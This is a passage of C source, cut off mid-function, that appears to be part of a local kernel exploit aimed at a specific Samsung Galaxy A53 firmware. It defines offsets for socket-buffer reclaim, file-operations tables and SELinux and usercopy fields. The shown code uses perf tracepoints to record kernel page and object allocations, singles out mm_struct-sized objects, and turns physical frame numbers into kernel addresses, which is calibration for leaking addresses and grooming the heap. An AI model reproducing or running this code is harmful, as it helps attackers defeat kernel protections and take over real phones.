#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/perf_event.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define PAGE_SIZE 4096
#define KS_PAGE_SIZE PAGE_SIZE
#define APPENDED_FUTEXES 2048
#define REPEAT_MEASUREMENT 64
#define AVERAGE 8
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL
#define MM_STRUCT_SZ 0x3c0
#define MM_ORDER 3
#define MM_PAGE_FREE_ID 258
#define KMEM_CACHE_FREE_ID 257
#define MM_PARTIALS 5
#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
#define SKB_DATA_HEAD_SIZE 0xe80
#define SKB_RECLAIM_ORDER MM_ORDER
#define SKB_RECLAIM_SIZE ORDER3_SIZE
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_DATA_DELTA (-SKB_DATA_HEAD_SIZE)
#define SKB_PAYLOAD_OFFSET SKB_DATA_HEAD_SIZE
#define FOPS_OFFSET 0x100
#define FOPS_TABLE_SIZE 0x120
#define SKB_USERCOPY_LOCK_OFF 0x900
#define SKB_USERCOPY_VALUE_OFF 0xa00
#define SKB_SELINUX_LOCK_OFF 0xb00
#define SKB_OWNER_LOCK_OFF 0xc00
#define PERF_RING_DATA_PAGES 8
#define PERF_CAPTURE_MAX 16384

#ifndef TARGET_HEADER
#define TARGET_HEADER "targets/a53x-A536EXXSNGZG3/target.h"
#endif
#include TARGET_HEADER
#include "kernelsnitch/kernelsnitch.h"

struct mm_ctx {
    size_t count;
    pid_t *children;
    int *memfds;
};

struct perf_page_sample {
    int32_t pid;
    uint64_t pfn;
    uint32_t order;
    uint32_t gfp_flags;
    int32_t migratetype;
};

struct perf_kmem_sample {
    int32_t pid;
    uint64_t callsite;
    uint64_t pointer;
    uint64_t requested;
    uint64_t allocated;
};

struct perf_object_free_sample {
    int32_t pid;
    uint64_t callsite;
    uint64_t pointer;
};

struct perf_capture {
    int page_fd;
    int free_fd;
    int kmem_fd;
    int object_free_fd;
    unsigned char *page_map;
    unsigned char *free_map;
    unsigned char *kmem_map;
    unsigned char *object_free_map;
    size_t page_map_size;
    size_t free_map_size;
    size_t kmem_map_size;
    size_t object_free_map_size;
    struct perf_page_sample pages[PERF_CAPTURE_MAX];
    struct perf_page_sample free_pages[PERF_CAPTURE_MAX];
    struct perf_kmem_sample kmem[PERF_CAPTURE_MAX];
    struct perf_object_free_sample object_frees[PERF_CAPTURE_MAX];
    size_t page_count;
    size_t free_page_count;
    size_t kmem_count;
    size_t object_free_count;
    size_t page_lost;
    size_t free_page_lost;
    size_t kmem_lost;
    size_t object_free_lost;
    size_t mm_alloc_count;
    uint64_t page_event_id;
};

static uint64_t probe_start_ms;

static void die(const char *what)
{
    perror(what);
    exit(1);
}

static void check_int(long value, const char *what)
{
    if (value < 0)
        die(what);
}

static uint64_t monotonic_ms(void)
{
    struct timespec time;

    if (clock_gettime(CLOCK_MONOTONIC, &time) < 0)
        die("clock_gettime");
    return (uint64_t)time.tv_sec * 1000 + (uint64_t)time.tv_nsec / 1000000;
}

static uint64_t elapsed_ms(void)
{
    return monotonic_ms() - probe_start_ms;
}

static int calibration_perf_cpu(void)
{
    const char *raw = getenv("PAGE_LEAK_PERF_CPU");
    char *end = NULL;
    long value;
    long count;

    if (!raw || !*raw)
        return -1;
    errno = 0;
    value = strtol(raw, &end, 0);
    count = sysconf(_SC_NPROCESSORS_ONLN);
    if (errno || end == raw || *end || value < 0 || count < 1 ||
        value >= count)
        return -1;
    return (int)value;
}

static int calibration_perf_cpu_for(uint64_t event_id)
{
    const char *name = NULL;
    const char *raw;
    char *end = NULL;
    long value;
    long count;

    if (event_id == MM_PAGE_FREE_ID)
        name = "PAGE_LEAK_PERF_FREE_CPU";
    else if (event_id == KMEM_CACHE_FREE_ID)
        name = "PAGE_LEAK_PERF_OBJECT_CPU";
    if (!name)
        return calibration_perf_cpu();
    raw = getenv(name);
    if (!raw || !*raw)
        return calibration_perf_cpu();
    errno = 0;
    value = strtol(raw, &end, 0);
    count = sysconf(_SC_NPROCESSORS_ONLN);
    if (errno || end == raw || *end || value < 0 || count < 1 ||
        value >= count)
        return -1;
    return (int)value;
}

static int calibration_perf_open(uint64_t event_id)
{
    struct perf_event_attr attr;
    int cpu = calibration_perf_cpu_for(event_id);
    int system_wide = getenv("PAGE_LEAK_PERF_SYSTEM_WIDE") != NULL;
    pid_t pid = system_wide || cpu >= 0 ? -1 : 0;

    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_TRACEPOINT;
    attr.size = sizeof(attr);
    attr.config = event_id;
    attr.sample_period = 1;
    attr.sample_type = PERF_SAMPLE_RAW;
    attr.wakeup_events = 1;
    attr.disabled = 1;
    attr.inherit = getenv("PAGE_LEAK_PERF_INHERIT") ? 1 : 0;
    attr.exclude_hv = 1;
    return (int)syscall(SYS_perf_event_open, &attr, pid, cpu, -1,
                         PERF_FLAG_FD_CLOEXEC);
}

static const char *calibration_perf_scope(void)
{
    if (getenv("PAGE_LEAK_PERF_SYSTEM_WIDE"))
        return "system";
    return calibration_perf_cpu() >= 0 ? "cpu" : "pid";
}

static size_t calibration_perf_ring_pages(void)
{
    const char *raw = getenv("PAGE_LEAK_PERF_RING_PAGES");
    char *end = NULL;
    unsigned long value;

    if (!raw || !*raw)
        return PERF_RING_DATA_PAGES;
    errno = 0;
    value = strtoul(raw, &end, 0);
    if (errno || end == raw || *end || value < 1 || value > 1024 ||
        (value & (value - 1)) != 0)
        return PERF_RING_DATA_PAGES;
    return (size_t)value;
}

static unsigned char *calibration_perf_map(int fd, size_t *map_size)
{
    *map_size = PAGE_SIZE * (calibration_perf_ring_pages() + 1);
    return mmap(NULL, *map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
}

static int calibration_perf_filter(int fd, const char *filter)
{
    if (ioctl(fd, PERF_EVENT_IOC_SET_FILTER, filter) < 0) {
        printf("PAGE_CALIBRATION_PERF_FILTER_FAIL errno=%d %s filter=%s\n",
               errno, strerror(errno), filter);
        return 0;
    }
    return 1;
}

static const char *calibration_kmem_filter(void)
{
    return "bytes_req == 960";
}

static int perf_mm_alloc_event(const struct perf_kmem_sample *sample)
{
    return sample->requested == MM_STRUCT_SZ;
}

static int perf_mm_free_event(const struct perf_object_free_sample *sample)
{
    (void)sample;
    return 1;
}

static int perf_capture_start(struct perf_capture *capture)
{
    memset(capture, 0, sizeof(*capture));
    capture->page_fd = -1;
    capture->free_fd = -1;
    capture->kmem_fd = -1;
    capture->object_free_fd = -1;
    capture->page_event_id = getenv("PAGE_LEAK_PERF_PAGE_FREE") ?
        MM_PAGE_FREE_ID : MM_PAGE_ALLOC_ID;
    capture->page_fd = calibration_perf_open(capture->page_event_id);
    if (capture->page_fd < 0) {
        printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=%s errno=%d %s scope=%s\n",
               capture->page_event_id == MM_PAGE_FREE_ID ?
                   "mm_page_free" : "mm_page_alloc",
               errno, strerror(errno), calibration_perf_scope());
        return 0;
    }
    if (getenv("PAGE_LEAK_PERF_PAGE_FILTER") &&
        !calibration_perf_filter(capture->page_fd,
                                 getenv("PAGE_LEAK_PERF_PAGE_FILTER"))) {
        close(capture->page_fd);
        capture->page_fd = -1;
        return 0;
    }
    capture->page_map = calibration_perf_map(capture->page_fd,
                                               &capture->page_map_size);
    if (capture->page_map == MAP_FAILED) {
        printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=mm_page_alloc_map errno=%d %s\n",
               errno, strerror(errno));
        close(capture->page_fd);
        capture->page_fd = -1;
        return 0;
    }
    capture->kmem_fd = calibration_perf_open(KMEM_CACHE_ALLOC_ID);
    if (capture->kmem_fd < 0) {
        printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=kmem_cache_alloc errno=%d %s\n",
               errno, strerror(errno));
        munmap(capture->page_map, capture->page_map_size);
        close(capture->page_fd);
        capture->page_map = NULL;
        capture->page_fd = -1;
        return 0;
    }
    if (getenv("PAGE_LEAK_PERF_KMEM_FILTER") &&
        !calibration_perf_filter(capture->kmem_fd,
                                 calibration_kmem_filter())) {
        close(capture->kmem_fd);
        munmap(capture->page_map, capture->page_map_size);
        capture->kmem_fd = -1;
        capture->page_map = NULL;
        close(capture->page_fd);
        capture->page_fd = -1;
        return 0;
    }
    capture->kmem_map = calibration_perf_map(capture->kmem_fd,
                                               &capture->kmem_map_size);
    if (capture->kmem_map == MAP_FAILED) {
        printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=kmem_cache_alloc_map errno=%d %s\n",
               errno, strerror(errno));
        munmap(capture->page_map, capture->page_map_size);
        close(capture->page_fd);
        close(capture->kmem_fd);
        capture->page_map = NULL;
        capture->page_fd = -1;
        capture->kmem_fd = -1;
        return 0;
    }
    if (getenv("PAGE_LEAK_PERF_BOTH")) {
        capture->free_fd = calibration_perf_open(MM_PAGE_FREE_ID);
        if (capture->free_fd < 0) {
            printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=mm_page_free errno=%d %s\n",
                   errno, strerror(errno));
            munmap(capture->page_map, capture->page_map_size);
            munmap(capture->kmem_map, capture->kmem_map_size);
            close(capture->page_fd);
            close(capture->kmem_fd);
            capture->page_map = NULL;
            capture->kmem_map = NULL;
            capture->page_fd = -1;
            capture->kmem_fd = -1;
            return 0;
        }
        if (getenv("PAGE_LEAK_PERF_PAGE_FILTER") &&
            !calibration_perf_filter(capture->free_fd,
                                     getenv("PAGE_LEAK_PERF_PAGE_FILTER"))) {
            close(capture->free_fd);
            munmap(capture->page_map, capture->page_map_size);
            munmap(capture->kmem_map, capture->kmem_map_size);
            close(capture->page_fd);
            close(capture->kmem_fd);
            capture->free_fd = -1;
            capture->page_map = NULL;
            capture->kmem_map = NULL;
            capture->page_fd = -1;
            capture->kmem_fd = -1;
            return 0;
        }
        capture->free_map = calibration_perf_map(capture->free_fd,
                                                  &capture->free_map_size);
        if (capture->free_map == MAP_FAILED) {
            printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=mm_page_free_map errno=%d %s\n",
                   errno, strerror(errno));
            close(capture->free_fd);
            munmap(capture->page_map, capture->page_map_size);
            munmap(capture->kmem_map, capture->kmem_map_size);
            close(capture->page_fd);
            close(capture->kmem_fd);
            capture->free_fd = -1;
            capture->page_map = NULL;
            capture->kmem_map = NULL;
            capture->page_fd = -1;
            capture->kmem_fd = -1;
            return 0;
        }
    }
    if (getenv("PAGE_LEAK_PERF_OBJECT_FREE")) {
        capture->object_free_fd = calibration_perf_open(KMEM_CACHE_FREE_ID);
        if (capture->object_free_fd < 0) {
            printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=kmem_cache_free errno=%d %s\n",
                   errno, strerror(errno));
            if (capture->free_map)
                munmap(capture->free_map, capture->free_map_size);
            munmap(capture->page_map, capture->page_map_size);
            munmap(capture->kmem_map, capture->kmem_map_size);
            close(capture->page_fd);
            close(capture->kmem_fd);
            if (capture->free_fd >= 0)
                close(capture->free_fd);
            capture->free_map = NULL;
            capture->page_map = NULL;
            capture->kmem_map = NULL;
            capture->page_fd = -1;
            capture->free_fd = -1;
            capture->kmem_fd = -1;
            return 0;
        }
        if (getenv("PAGE_LEAK_PERF_OBJECT_FILTER") &&
            !calibration_perf_filter(
                capture->object_free_fd,
                getenv("PAGE_LEAK_PERF_OBJECT_FILTER"))) {
            close(capture->object_free_fd);
            if (capture->free_map)
                munmap(capture->free_map, capture->free_map_size);
            munmap(capture->page_map, capture->page_map_size);
            munmap(capture->kmem_map, capture->kmem_map_size);
            close(capture->page_fd);
            close(capture->kmem_fd);
            if (capture->free_fd >= 0)
                close(capture->free_fd);
            capture->object_free_fd = -1;
            capture->free_map = NULL;
            capture->page_map = NULL;
            capture->kmem_map = NULL;
            capture->page_fd = -1;
            capture->free_fd = -1;
            capture->kmem_fd = -1;
            return 0;
        }
        capture->object_free_map = calibration_perf_map(capture->object_free_fd,
                                                         &capture->object_free_map_size);
        if (capture->object_free_map == MAP_FAILED) {
            printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=kmem_cache_free_map errno=%d %s\n",
                   errno, strerror(errno));
            close(capture->object_free_fd);
            if (capture->free_map)
                munmap(capture->free_map, capture->free_map_size);
            munmap(capture->page_map, capture->page_map_size);
            munmap(capture->kmem_map, capture->kmem_map_size);
            close(capture->page_fd);
            close(capture->kmem_fd);
            if (capture->free_fd >= 0)
                close(capture->free_fd);
            capture->object_free_fd = -1;
            capture->free_map = NULL;
            capture->page_map = NULL;
            capture->kmem_map = NULL;
            capture->page_fd = -1;
            capture->free_fd = -1;
            capture->kmem_fd = -1;
            return 0;
        }
    }
    if (ioctl(capture->page_fd, PERF_EVENT_IOC_RESET, 0) < 0 ||
        ioctl(capture->kmem_fd, PERF_EVENT_IOC_RESET, 0) < 0 ||
        (capture->free_fd >= 0 &&
         ioctl(capture->free_fd, PERF_EVENT_IOC_RESET, 0) < 0) ||
        (capture->object_free_fd >= 0 &&
         ioctl(capture->object_free_fd, PERF_EVENT_IOC_RESET, 0) < 0) ||
        ioctl(capture->page_fd, PERF_EVENT_IOC_ENABLE, 0) < 0 ||
        ioctl(capture->kmem_fd, PERF_EVENT_IOC_ENABLE, 0) < 0 ||
        (capture->free_fd >= 0 &&
         ioctl(capture->free_fd, PERF_EVENT_IOC_ENABLE, 0) < 0) ||
        (capture->object_free_fd >= 0 &&
         ioctl(capture->object_free_fd, PERF_EVENT_IOC_ENABLE, 0) < 0)) {
        printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=enable errno=%d %s\n",
               errno, strerror(errno));
        munmap(capture->page_map, capture->page_map_size);
        munmap(capture->kmem_map, capture->kmem_map_size);
        if (capture->free_map)
            munmap(capture->free_map, capture->free_map_size);
        if (capture->object_free_map)
            munmap(capture->object_free_map, capture->object_free_map_size);
        close(capture->page_fd);
        close(capture->kmem_fd);
        if (capture->free_fd >= 0)
            close(capture->free_fd);
        if (capture->object_free_fd >= 0)
            close(capture->object_free_fd);
        capture->page_map = NULL;
        capture->kmem_map = NULL;
        capture->free_map = NULL;
        capture->object_free_map = NULL;
        capture->page_fd = -1;
        capture->kmem_fd = -1;
        capture->free_fd = -1;
        capture->object_free_fd = -1;
        return 0;
    }
    printf("PAGE_CALIBRATION_PERF_READY page_id=%" PRIu64
           " kmem_id=%u inherit=%d scope=%s ring_pages=%zu\n",
           capture->page_event_id, KMEM_CACHE_ALLOC_ID,
           getenv("PAGE_LEAK_PERF_INHERIT") ? 1 : 0,
           calibration_perf_scope(),
           calibration_perf_ring_pages());
    return 1;
}

static int perf_capture_start_kmem(struct perf_capture *capture)
{
    memset(capture, 0, sizeof(*capture));
    capture->page_fd = -1;
    capture->free_fd = -1;
    capture->kmem_fd = -1;
    capture->object_free_fd = -1;
    capture->kmem_fd = calibration_perf_open(KMEM_CACHE_ALLOC_ID);
    if (capture->kmem_fd < 0) {
        printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=kmem_cache_alloc errno=%d %s scope=%s\n",
               errno, strerror(errno), calibration_perf_scope());
        return 0;
    }
    if (!calibration_perf_filter(capture->kmem_fd,
                                 calibration_kmem_filter())) {
        close(capture->kmem_fd);
        capture->kmem_fd = -1;
        return 0;
    }
    capture->kmem_map = calibration_perf_map(capture->kmem_fd,
                                               &capture->kmem_map_size);
    if (capture->kmem_map == MAP_FAILED) {
        printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=kmem_cache_alloc_map errno=%d %s\n",
               errno, strerror(errno));
        close(capture->kmem_fd);
        capture->kmem_fd = -1;
        capture->kmem_map = NULL;
        return 0;
    }
    if (ioctl(capture->kmem_fd, PERF_EVENT_IOC_RESET, 0) < 0 ||
        ioctl(capture->kmem_fd, PERF_EVENT_IOC_ENABLE, 0) < 0) {
        printf("PAGE_CALIBRATION_PERF_UNAVAILABLE kind=enable errno=%d %s\n",
               errno, strerror(errno));
        munmap(capture->kmem_map, capture->kmem_map_size);
        close(capture->kmem_fd);
        capture->kmem_map = NULL;
        capture->kmem_fd = -1;
        return 0;
    }
    capture->page_event_id = MM_PAGE_ALLOC_ID;
    printf("PAGE_CALIBRATION_PERF_READY page_id=none kmem_id=%u inherit=%d scope=%s ring_pages=%zu kmem_only=1\n",
           KMEM_CACHE_ALLOC_ID,
           getenv("PAGE_LEAK_PERF_INHERIT") ? 1 : 0,
           calibration_perf_scope(), calibration_perf_ring_pages());
    return 1;
}

static void perf_ring_copy(unsigned char *destination,
                           const unsigned char *ring, size_t ring_size,
                           uint64_t offset, size_t length)
{
    size_t start = (size_t)(offset & (ring_size - 1));
    size_t first = ring_size - start;

    if (first > length)
        first = length;
    memcpy(destination, ring + start, first);
    if (first < length)
        memcpy(destination + first, ring, length - first);
}

static void perf_capture_pages(struct perf_capture *capture)
{
    struct perf_event_mmap_page *meta =
        (struct perf_event_mmap_page *)capture->page_map;
    const unsigned char *ring = capture->page_map + PAGE_SIZE;
    uint64_t head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
    uint64_t tail = meta->data_tail;

    if (head - tail > meta->data_size) {
        capture->page_lost++;
        tail = head - meta->data_size;
    }
    while (tail < head) {
        struct perf_event_header header;
        unsigned char record[128];
        uint32_t raw_size;
        uint16_t event_id;
        int32_t event_pid;
        uint64_t pfn;
        uint32_t order;
        uint32_t gfp_flags = 0;
        int32_t migratetype = -1;

        perf_ring_copy((unsigned char *)&header, ring, meta->data_size, tail,
                       sizeof(header));
        if (header.size < sizeof(header) || header.size > sizeof(record)) {
            capture->page_lost++;
            break;
        }
        perf_ring_copy(record, ring, meta->data_size, tail, header.size);
        tail += header.size;
        if (header.type != PERF_RECORD_SAMPLE || header.size < 40)
            continue;
        memcpy(&raw_size, record + 8, sizeof(raw_size));
        if (raw_size < 28 || raw_size + 12 > header.size)
            continue;
        memcpy(&event_id, record + 12, sizeof(event_id));
        memcpy(&event_pid, record + 16, sizeof(event_pid));
        memcpy(&pfn, record + 20, sizeof(pfn));
        memcpy(&order, record + 28, sizeof(order));
        if (raw_size >= 28) {
            memcpy(&gfp_flags, record + 32, sizeof(gfp_flags));
            memcpy(&migratetype, record + 36, sizeof(migratetype));
        }
        if (event_id != capture->page_event_id)
            continue;
        if (capture->page_count < PERF_CAPTURE_MAX) {
            capture->pages[capture->page_count].pid = event_pid;
            capture->pages[capture->page_count].pfn = pfn;
            capture->pages[capture->page_count].order = order;
            capture->pages[capture->page_count].gfp_flags = gfp_flags;
            capture->pages[capture->page_count].migratetype = migratetype;
            capture->page_count++;
        } else {
            capture->page_lost++;
        }
    }
    __atomic_store_n(&meta->data_tail, tail, __ATOMIC_RELEASE);
}

static void perf_capture_kmem(struct perf_capture *capture)
{
    struct perf_event_mmap_page *meta =
        (struct perf_event_mmap_page *)capture->kmem_map;
    const unsigned char *ring = capture->kmem_map + PAGE_SIZE;
    uint64_t head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
    uint64_t tail = meta->data_tail;

    if (head - tail > meta->data_size) {
        capture->kmem_lost++;
        tail = head - meta->data_size;
    }
    while (tail < head) {
        struct perf_event_header header;
        unsigned char record[128];
        uint32_t raw_size;
        uint16_t event_id;
        int32_t event_pid;
        uint64_t callsite;
        uint64_t pointer;
        uint64_t requested;
        uint64_t allocated;

        perf_ring_copy((unsigned char *)&header, ring, meta->data_size, tail,
                       sizeof(header));
        if (header.size < sizeof(header) || header.size > sizeof(record)) {
            capture->kmem_lost++;
            break;
        }
        perf_ring_copy(record, ring, meta->data_size, tail, header.size);
        tail += header.size;
        if (header.type != PERF_RECORD_SAMPLE || header.size < 56)
            continue;
        memcpy(&raw_size, record + 8, sizeof(raw_size));
        if (raw_size < 52 || raw_size + 12 > header.size)
            continue;
        memcpy(&event_id, record + 12, sizeof(event_id));
        memcpy(&event_pid, record + 16, sizeof(event_pid));
        memcpy(&callsite, record + 20, sizeof(callsite));
        memcpy(&pointer, record + 28, sizeof(pointer));
        memcpy(&requested, record + 36, sizeof(requested));
        memcpy(&allocated, record + 44, sizeof(allocated));
        if (event_id != KMEM_CACHE_ALLOC_ID)
            continue;
        if (capture->kmem_count < PERF_CAPTURE_MAX) {
            capture->kmem[capture->kmem_count].pid = event_pid;
            capture->kmem[capture->kmem_count].callsite = callsite;
            capture->kmem[capture->kmem_count].pointer = pointer;
            capture->kmem[capture->kmem_count].requested = requested;
            capture->kmem[capture->kmem_count].allocated = allocated;
            if (perf_mm_alloc_event(&capture->kmem[capture->kmem_count]))
                capture->mm_alloc_count++;
            capture->kmem_count++;
        } else {
            capture->kmem_lost++;
        }
    }
    __atomic_store_n(&meta->data_tail, tail, __ATOMIC_RELEASE);
}

static void perf_capture_object_free(struct perf_capture *capture)
{
    struct perf_event_mmap_page *meta;
    const unsigned char *ring;
    uint64_t head;
    uint64_t tail;

    if (!capture->object_free_map)
        return;
    meta = (struct perf_event_mmap_page *)capture->object_free_map;
    ring = capture->object_free_map + PAGE_SIZE;
    head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
    tail = meta->data_tail;
    if (head - tail > meta->data_size) {
        capture->object_free_lost++;
        tail = head - meta->data_size;
    }
    while (tail < head) {
        struct perf_event_header header;
        unsigned char record[128];
        uint32_t raw_size;
        uint16_t event_id;
        int32_t event_pid;
        uint64_t callsite;
        uint64_t pointer;

        perf_ring_copy((unsigned char *)&header, ring, meta->data_size, tail,
                       sizeof(header));
        if (header.size < sizeof(header) || header.size > sizeof(record)) {
            capture->object_free_lost++;
            break;
        }
        perf_ring_copy(record, ring, meta->data_size, tail, header.size);
        tail += header.size;
        if (header.type != PERF_RECORD_SAMPLE || header.size < 40)
            continue;
        memcpy(&raw_size, record + 8, sizeof(raw_size));
        if (raw_size < 28 || raw_size + 12 > header.size)
            continue;
        memcpy(&event_id, record + 12, sizeof(event_id));
        memcpy(&event_pid, record + 16, sizeof(event_pid));
        memcpy(&callsite, record + 20, sizeof(callsite));
        memcpy(&pointer, record + 28, sizeof(pointer));
        if (event_id != KMEM_CACHE_FREE_ID)
            continue;
        if (capture->object_free_count < PERF_CAPTURE_MAX) {
            capture->object_frees[capture->object_free_count].pid = event_pid;
            capture->object_frees[capture->object_free_count].callsite = callsite;
            capture->object_frees[capture->object_free_count].pointer = pointer;
            capture->object_free_count++;
        } else {
            capture->object_free_lost++;
        }
    }
    __atomic_store_n(&meta->data_tail, tail, __ATOMIC_RELEASE);
}

static void perf_capture_free_pages(struct perf_capture *capture)
{
    struct perf_event_mmap_page *meta;
    const unsigned char *ring;
    uint64_t head;
    uint64_t tail;

    if (!capture->free_map)
        return;
    meta = (struct perf_event_mmap_page *)capture->free_map;
    ring = capture->free_map + PAGE_SIZE;
    head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
    tail = meta->data_tail;
    if (head - tail > meta->data_size) {
        capture->free_page_lost++;
        tail = head - meta->data_size;
    }
    while (tail < head) {
        struct perf_event_header header;
        unsigned char record[128];
        uint32_t raw_size;
        uint16_t event_id;
        int32_t event_pid;
        uint64_t pfn;
        uint32_t order;

        perf_ring_copy((unsigned char *)&header, ring, meta->data_size, tail,
                       sizeof(header));
        if (header.size < sizeof(header) || header.size > sizeof(record)) {
            capture->free_page_lost++;
            break;
        }
        perf_ring_copy(record, ring, meta->data_size, tail, header.size);
        tail += header.size;
        if (header.type != PERF_RECORD_SAMPLE || header.size < 40)
            continue;
        memcpy(&raw_size, record + 8, sizeof(raw_size));
        if (raw_size < 28 || raw_size + 12 > header.size)
            continue;
        memcpy(&event_id, record + 12, sizeof(event_id));
        memcpy(&event_pid, record + 16, sizeof(event_pid));
        memcpy(&pfn, record + 20, sizeof(pfn));
        memcpy(&order, record + 28, sizeof(order));
        if (event_id != MM_PAGE_FREE_ID)
            continue;
        if (capture->free_page_count < PERF_CAPTURE_MAX) {
            capture->free_pages[capture->free_page_count].pid = event_pid;
            capture->free_pages[capture->free_page_count].pfn = pfn;
            capture->free_pages[capture->free_page_count].order = order;
            capture->free_page_count++;
        } else {
            capture->free_page_lost++;
        }
    }
    __atomic_store_n(&meta->data_tail, tail, __ATOMIC_RELEASE);
}

static void perf_capture_stop(struct perf_capture *capture)
{
    size_t order3_count = 0;
    size_t order3_printed = 0;
    size_t mm_printed = 0;
    size_t free_order3_count = 0;
    size_t free_order3_printed = 0;
    size_t alloc_order[16] = {0};
    size_t free_order[16] = {0};
    size_t alloc_order_other = 0;
    size_t free_order_other = 0;

    if (capture->page_fd >= 0)
        ioctl(capture->page_fd, PERF_EVENT_IOC_DISABLE, 0);
    if (capture->free_fd >= 0)
        ioctl(capture->free_fd, PERF_EVENT_IOC_DISABLE, 0);
    if (capture->kmem_fd >= 0)
        ioctl(capture->kmem_fd, PERF_EVENT_IOC_DISABLE, 0);
    if (capture->object_free_fd >= 0)
        ioctl(capture->object_free_fd, PERF_EVENT_IOC_DISABLE, 0);
    if (capture->page_map)
        perf_capture_pages(capture);
    if (capture->free_map)
        perf_capture_free_pages(capture);
    if (capture->kmem_map)
        perf_capture_kmem(capture);
    if (capture->object_free_map)
        perf_capture_object_free(capture);
    for (size_t i = 0; i < capture->page_count; ++i) {
        if (capture->pages[i].order < 16)
            alloc_order[capture->pages[i].order]++;
        else
            alloc_order_other++;
        if (capture->pages[i].order == MM_ORDER)
            order3_count++;
    }
    printf("PAGE_CALIBRATION_PERF_PAGE id=%" PRIu64
           " samples=%zu order3=%zu lost=%zu\n",
           capture->page_event_id, capture->page_count, order3_count,
           capture->page_lost);
    printf("PAGE_CALIBRATION_PERF_ALLOC_ORDER o0=%zu o1=%zu o2=%zu "
           "o3=%zu o4=%zu o5=%zu other=%zu\n",
           alloc_order[0], alloc_order[1], alloc_order[2], alloc_order[3],
           alloc_order[4], alloc_order[5], alloc_order_other);
    for (size_t i = 0; i < capture->page_count; ++i) {
        uint64_t physical;
        uintptr_t alias;

        if (capture->pages[i].order != MM_ORDER || order3_printed >= 128)
            continue;
        physical = capture->pages[i].pfn << 12;
        alias = physical >= PHYS_OFFSET ?
            PAGE_OFFSET | (physical - PHYS_OFFSET) : 0;
        printf("PAGE_CALIBRATION_PERF_EVENT pid=%d pfn=0x%016" PRIx64
               " order=%u gfp=0x%08x mt=%d base=0x%016zx\n",
               capture->pages[i].pid, capture->pages[i].pfn,
               capture->pages[i].order, capture->pages[i].gfp_flags,
               capture->pages[i].migratetype, alias);
        order3_printed++;
    }
    if (order3_count > order3_printed)
        printf("PAGE_CALIBRATION_PERF_EVENT_TRUNCATED total=%zu shown=%zu\n",
               order3_count, order3_printed);
    for (size_t i = 0; i < capture->free_page_count; ++i) {
        if (capture->free_pages[i].order < 16)
            free_order[capture->free_pages[i].order]++;
        else
            free_order_other++;
        if (capture->free_pages[i].order == MM_ORDER)
            free_order3_count++;
    }
    if (capture->free_map) {
        printf("PAGE_CALIBRATION_PERF_FREE samples=%zu order3=%zu lost=%zu\n",
               capture->free_page_count, free_order3_count,
               capture->free_page_lost);
        printf("PAGE_CALIBRATION_PERF_FREE_ORDER o0=%zu o1=%zu o2=%zu "
               "o3=%zu o4=%zu o5=%zu other=%zu\n",
               free_order[0], free_order[1], free_order[2], free_order[3],
               free_order[4], free_order[5], free_order_other);
        for (size_t i = 0; i < capture->free_page_count &&
             free_order3_printed < 128; ++i) {
            uint64_t physical;
            uintptr_t alias;

            if (capture->free_pages[i].order != MM_ORDER)
                continue;
            physical = capture->free_pages[i].pfn << 12;
            alias = physical >= PHYS_OFFSET ?
                PAGE_OFFSET | (physical - PHYS_OFFSET) : 0;
            printf("PAGE_CALIBRATION_PERF_FREE_EVENT pid=%d pfn=0x%016" PRIx64
                   " order=%u base=0x%016zx\n",
                   capture->free_pages[i].pid,
                   capture->free_pages[i].pfn,
                   capture->free_pages[i].order, alias);
            free_order3_printed++;
        }
    }
    printf("PAGE_CALIBRATION_PERF_KMEM samples=%zu mm_struct=%zu lost=%zu\n",
           capture->kmem_count, capture->mm_alloc_count, capture->kmem_lost);
    for (size_t i = 0; i < capture->kmem_count && mm_printed < 128; ++i) {
        if (!perf_mm_alloc_event(&capture->kmem[i]))
            continue;
        printf("PAGE_CALIBRATION_PERF_KMEM_EVENT pid=%d ptr=0x%016" PRIx64
               " callsite=0x%016" PRIx64 " requested=0x%" PRIx64
               " allocated=0x%" PRIx64 "\n",
               capture->kmem[i].pid, capture->kmem[i].pointer,
               capture->kmem[i].callsite, capture->kmem[i].requested,
               capture->kmem[i].allocated);
        mm_printed++;
    }
    if (capture->mm_alloc_count > mm_printed)
        printf("PAGE_CALIBRATION_PERF_KMEM_TRUNCATED total=%zu shown=%zu\n",
               capture->mm_alloc_count, mm_printed);
    if (capture->object_free_map) {
        size_t object_free_printed = 0;

        printf("PAGE_CALIBRATION_PERF_OBJECT_FREE samples=%zu lost=%zu\n",
               capture->object_free_count, capture->object_free_lost);
        for (size_t i = 0; i < capture->object_free_count &&
             object_free_printed < 128; ++i) {
            printf("PAGE_CALIBRATION_PERF_OBJECT_FREE_EVENT pid=%d ptr=0x%016" PRIx64
                   " callsite=0x%016" PRIx64 "\n",
                   capture->object_frees[i].pid,
                   capture->object_frees[i].pointer,
                   capture->object_frees[i].callsite);
            object_free_printed++;
        }
    }
    if (capture->page_map)
        munmap(capture->page_map, capture->page_map_size);
    if (capture->free_map)
        munmap(capture->free_map, capture->free_map_size);
    if (capture->kmem_map)
